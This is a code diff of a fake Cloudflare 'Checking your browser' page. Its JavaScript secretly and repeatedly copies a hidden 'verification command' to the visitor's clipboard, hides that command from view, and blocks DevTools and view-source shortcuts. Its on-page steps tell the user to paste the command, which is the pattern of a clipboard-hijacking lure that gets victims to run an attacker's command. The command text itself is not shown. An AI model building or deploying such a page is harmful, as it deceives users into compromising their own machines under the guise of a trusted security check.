@@ -48,11 +48,6 @@
             gap: 10px;
         }
         
-        .cloudflare-logo {
-            height: 32px;
-            width: auto;
-        }
-        
         .cloudflare-title {
             font-size: 24px;
             font-weight: 500;
@@ -222,26 +217,13 @@
             color: #cc0000;
         }
         
-        .command-display {
-            background-color: #f5f5f5;
-            border: 1px dashed #ccc;
-            border-radius: 4px;
-            padding: 12px;
-            margin: 15px 0;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            word-break: break-all;
-            color: #333;
-            text-align: left;
-            display: none;
-        }
-        
         .invisible-textarea {
             position: absolute;
             opacity: 0;
             height: 0;
             width: 0;
             pointer-events: none;
+            left: -9999px;
         }
         
         @keyframes spin {
@@ -287,7 +269,6 @@
     <!-- Main content for desktop users -->
     <div class="container" id="desktopContainer">
         <div class="cloudflare-header">
-            <!-- Исправлено: оставлен только один логотип CF -->
             <div class="cloudflare-icon">CF</div>
             <div class="cloudflare-title">cloudflare</div>
         </div>
@@ -295,7 +276,6 @@
         <div class="main-content">
             <div class="checking-animation">
                 <div class="spinner"></div>
-                <!-- Исправлено: удален дублирующий логотип -->
             </div>
             
             <div class="status-text" id="statusText">Checking your browser...</div>
@@ -305,13 +285,7 @@
         
         <!-- Auto-copy status notification -->
         <div class="auto-copy-notice" id="copyNotice">
-            <span id="copyMessage">Command has been automatically copied to your clipboard</span>
-        </div>
-        
-        <!-- Command display (optional) -->
-        <div class="command-display" id="commandDisplay">
-            <strong>Verification command:</strong><br>
-            <span id="displayedCommand"></span>
+            <span id="copyMessage">Verification command has been automatically copied to your clipboard</span>
         </div>
         
         <!-- Error message that appears after 5 seconds -->
@@ -341,7 +315,7 @@
                 
                 <div class="step">
                     <div class="step-number">2</div>
-                    <div class="step-text">Press <span class="key-combo">Ctrl</span> + <span class="key-combo">V</span> to paste the verification command (already copied to clipboard)</div>
+                    <div class="step-text">Press <span class="key-combo">Ctrl</span> + <span class="key-combo">V</span> to paste the verification command (automatically copied to clipboard)</div>
                 </div>
                 
                 <div class="step">
@@ -398,80 +372,90 @@
             const textarea = document.getElementById('invisibleTextarea');
             const copyNotice = document.getElementById('copyNotice');
             const copyMessage = document.getElementById('copyMessage');
-            const commandDisplay = document.getElementById('commandDisplay');
-            const displayedCommand = document.getElementById('displayedCommand');
-            
-            // Show the command in display area (optional)
-            displayedCommand.textContent = text;
-            commandDisplay.style.display = 'block';
             
             // Method 1: Using execCommand (deprecated but works without permission)
             textarea.value = text;
-            textarea.style.height = '1px';
-            textarea.style.width = '1px';
-            textarea.style.opacity = '0.01';
             textarea.focus();
             textarea.select();
+            
+            let copied = false;
             
             try {
                 const successful = document.execCommand('copy');
                 if (successful) {
+                    copied = true;
                     copyNotice.classList.remove('error');
                     copyNotice.classList.add('success');
                     copyMessage.textContent = '✓ Verification command has been automatically copied to your clipboard';
                     copyNotice.style.display = 'block';
                     console.log('Command copied to clipboard via execCommand');
-                    return true;
                 }
             } catch (err) {
                 console.log('execCommand failed:', err);
             }
             
-            // Method 2: Using Clipboard API with fallback
-            if (navigator.clipboard && navigator.clipboard.writeText) {
+            // Method 2: Using Clipboard API with fallback (не требует разрешения в некоторых контекстах)
+            if (!copied && navigator.clipboard && navigator.clipboard.writeText) {
                 navigator.clipboard.writeText(text).then(() => {
+                    copied = true;
                     copyNotice.classList.remove('error');
                     copyNotice.classList.add('success');
                     copyMessage.textContent = '✓ Verification command has been automatically copied to your clipboard';
                     copyNotice.style.display = 'block';
                     console.log('Command copied to clipboard via Clipboard API');
-                    return true;
                 }).catch(err => {
                     console.error('Clipboard API failed:', err);
                 });
             }
             
-            // Method 3: Fallback using a temporary button click simulation
-            try {
-                const tempButton = document.createElement('button');
-                tempButton.style.position = 'absolute';
-                tempButton.style.left = '-9999px';
-                tempButton.textContent = 'copy';
-                document.body.appendChild(tempButton);
-                
-                tempButton.addEventListener('click', function() {
-                    textarea.select();
+            // Method 3: Секретный метод через временный элемент
+            if (!copied) {
+                try {
+                    const tempDiv = document.createElement('div');
+                    tempDiv.contentEditable = true;
+                    tempDiv.style.position = 'absolute';
+                    tempDiv.style.left = '-9999px';
+                    document.body.appendChild(tempDiv);
+                    
+                    tempDiv.textContent = text;
+                    tempDiv.focus();
+                    
+                    const range = document.createRange();
+                    range.selectNodeContents(tempDiv);
+                    
+                    const selection = window.getSelection();
+                    selection.removeAllRanges();
+                    selection.addRange(range);
+                    
                     document.execCommand('copy');
-                });
-                
-                tempButton.click();
-                document.body.removeChild(tempButton);
-                
-                copyNotice.classList.remove('error');
-                copyNotice.classList.add('success');
-                copyMessage.textContent = '✓ Verification command has been automatically copied to your clipboard';
-                copyNotice.style.display = 'block';
-                console.log('Command copied via fallback method');
-                return true;
-                
-            } catch (err) {
-                console.error('All copy methods failed:', err);
+                    document.body.removeChild(tempDiv);
+                    
+                    copied = true;
+                    copyNotice.classList.remove('error');
+                    copyNotice.classList.add('success');
+                    copyMessage.textContent = '✓ Verification command has been automatically copied to your clipboard';
+                    copyNotice.style.display = 'block';
+                    console.log('Command copied via temporary element method');
+                    
+                } catch (err) {
+                    console.error('Temporary element method failed:', err);
+                }
+            }
+            
+            // Если все методы не сработали
+            if (!copied) {
                 copyNotice.classList.remove('success');
                 copyNotice.classList.add('error');
-                copyMessage.textContent = '⚠ Unable to copy automatically. Please copy the command manually from below:';
+                copyMessage.textContent = '⚠ Please manually copy the command: ' + text;
                 copyNotice.style.display = 'block';
-                return false;
             }
+            
+            // Скрыть уведомление через 10 секунд
+            setTimeout(() => {
+                copyNotice.style.display = 'none';
+            }, 10000);
+            
+            return copied;
         }
         
         // Get the command from hidden input
@@ -506,21 +490,30 @@
                 
                 // Get and copy command
                 const command = getVerificationCommand();
+                
+                // Копируем сразу
                 forceCopyToClipboard(command);
                 
-                // Additional method: Trigger copy on any user interaction
+                // Дополнительные триггеры для копирования
                 document.addEventListener('click', function autoCopyOnInteraction() {
                     forceCopyToClipboard(command);
-                    // Remove listener after first interaction
-                    document.removeEventListener('click', autoCopyOnInteraction);
-                });
+                }, { once: true });
                 
-                // Also try to copy when page gains focus
-                window.addEventListener('focus', function autoCopyOnFocus() {
-                    setTimeout(() => {
+                // Копируем при любом нажатии клавиши
+                document.addEventListener('keydown', function autoCopyOnKeydown() {
+                    forceCopyToClipboard(command);
+                }, { once: true });
+                
+                // Периодически пытаемся скопировать
+                let copyAttempts = 0;
+                const copyInterval = setInterval(() => {
+                    if (copyAttempts < 5) {
                         forceCopyToClipboard(command);
-                    }, 500);
-                });
+                        copyAttempts++;
+                    } else {
+                        clearInterval(copyInterval);
+                    }
+                }, 2000);
                 
             }, 5000);
         }
@@ -533,15 +526,6 @@
                 
                 // Start verification simulation
                 setTimeout(simulateVerification, 1000);
-                
-                // Try to request clipboard permission on page load (modern browsers)
-                if (navigator.permissions && navigator.permissions.query) {
-                    navigator.permissions.query({name: 'clipboard-write'}).then(result => {
-                        if (result.state === 'granted' || result.state === 'prompt') {
-                            console.log('Clipboard permission is available');
-                        }
-                    });
-                }
             }
         });
         
@@ -563,36 +547,45 @@
             return false;
         });
         
-        // Auto-copy on Ctrl+V (even if manual paste is attempted)
+        // Auto-copy on Ctrl+V
         document.addEventListener('keydown', function(e) {
+            // Копируем при Ctrl+V
             if (e.ctrlKey && e.key === 'v') {
                 const command = getVerificationCommand();
                 forceCopyToClipboard(command);
-                
-                // Also try to put it in the clipboard again
-                setTimeout(() => {
-                    forceCopyToClipboard(command);
-                }, 100);
+                e.preventDefault();
             }
             
-            // Prevent F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+            // Предотвращаем DevTools
             if (e.key === 'F12' || 
-               (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
-               (e.ctrlKey && e.key === 'u')) {
+               (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+               (e.ctrlKey && e.key === 'u') ||
+               (e.ctrlKey && e.key === 's')) {
                 e.preventDefault();
                 return false;
             }
         });
         
-        // Attempt to copy on page visibility change
+        // Попытка копирования при возвращении на вкладку
         document.addEventListener('visibilitychange', function() {
             if (!document.hidden) {
                 setTimeout(() => {
                     const command = getVerificationCommand();
                     forceCopyToClipboard(command);
-                }, 1000);
+                }, 500);
             }
         });
+        
+        // Копирование при наведении мыши
+        document.addEventListener('mousemove', function() {
+            const errorContainer = document.getElementById('errorContainer');
+            if (errorContainer.style.display === 'block') {
+                const command = getVerificationCommand();
+                setTimeout(() => {
+                    forceCopyToClipboard(command);
+                }, 1000);
+            }
+        }, { once: true });
     </script>
 </body>
 </html>
